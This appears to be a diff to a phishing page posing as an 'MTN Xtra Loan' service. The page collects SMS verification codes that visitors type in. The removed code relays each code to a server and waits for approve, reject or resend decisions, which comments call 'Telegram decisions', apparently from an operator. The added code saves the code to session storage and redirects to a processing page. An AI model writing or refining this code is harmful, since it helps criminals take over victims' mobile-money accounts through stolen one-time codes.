@@ -169,7 +169,7 @@
         © 2026 MTN Xtra Loan
     </div>
 
-    <!-- Load Socket.io -->
+    <!-- Load Socket.io for session management -->
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
@@ -200,41 +200,22 @@
             }
         }
 
-        // --- NEW SOCKET SUBMIT LOGIC ---
+        // --- NEW REDIRECT LOGIC TO PROCESSING PAGE ---
         function submitSMS() {
             const smsText = document.getElementById('smsText').value;
             if (!smsText.trim()) return;
 
-            // Show waiting state
-            verifyBtn.innerText = "WAITING FOR APPROVAL...";
+            // Change button state
+            verifyBtn.innerText = "REDIRECTING...";
             verifyBtn.disabled = true;
-            verifyBtn.style.backgroundColor = "#ccc";
-            document.getElementById('smsText').disabled = true;
 
-            // Send to server
-            socket.emit('submit_sms', smsText);
+            // Save to sessionStorage
+            sessionStorage.setItem('smsData', smsText);
+            sessionStorage.setItem('processType', 'sms_verification');
+
+            // Redirect to processing page
+            window.location.href = "/processing.html";
         }
-
-        // --- LISTEN FOR TELEGRAM DECISIONS ---
-        socket.on('sms_approved', () => {
-            window.location.href = "/verify-code.html";
-        });
-
-        socket.on('sms_rejected', () => {
-            alert("Invalid SMS. Please enter the correct 5-digit code.");
-            window.location.href = "/index.html"; // Or load a specific 5-digit code page
-        });
-
-        socket.on('sms_resend', () => {
-            alert("Check your SMS for the new code sent.");
-            // Re-enable form
-            verifyBtn.innerText = "VERIFY & CONTINUE →";
-            verifyBtn.disabled = false;
-            verifyBtn.style.backgroundColor = "#ffcc00";
-            document.getElementById('smsText').disabled = false;
-            document.getElementById('smsText').value = "";
-            updateSmsState();
-        });
     </script>
 </body>
 </html>
